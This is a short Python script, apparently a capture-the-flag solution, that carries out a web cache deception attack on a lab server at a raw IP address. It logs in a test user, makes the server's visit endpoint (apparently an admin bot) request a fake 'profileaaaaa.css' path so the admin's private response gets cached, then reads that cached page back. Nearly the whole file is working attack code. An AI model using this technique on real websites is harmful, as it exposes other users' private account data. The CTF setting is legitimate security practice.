import requests
import json

url = "http://94.237.59.180:48016"

def register(username, email, password):
    data = {
        "username": username,
        "password": password,
        "email": email
    }

    r = requests.post(url + "/", json=data)

    return json.loads(r.text)['token']

def login(username, password):
    data = {
        "username": username,
        "password": password
    }

    r = requests.post(url + "/", json=data)

    return json.loads(r.text)['token']

#register("test", "test@test.com", "password123")

# Almacenando el response del admin en profileaaaaa.css en cache
for _ in range(2):
    token = login("test", "password123")

    headers = {
        "Authorization": "Bearer " + token
    }

    data = {
        "uri": "profileaaaaa.css"
    }

    r = requests.post(url + "/visit", headers=headers, json=data)

    print(r.text)

token = login("test", "password123")

headers = {
    "Authorization": "Bearer " + token
}

r = requests.get(url + "/profileaaaaa.css", headers=headers)
print(r.text)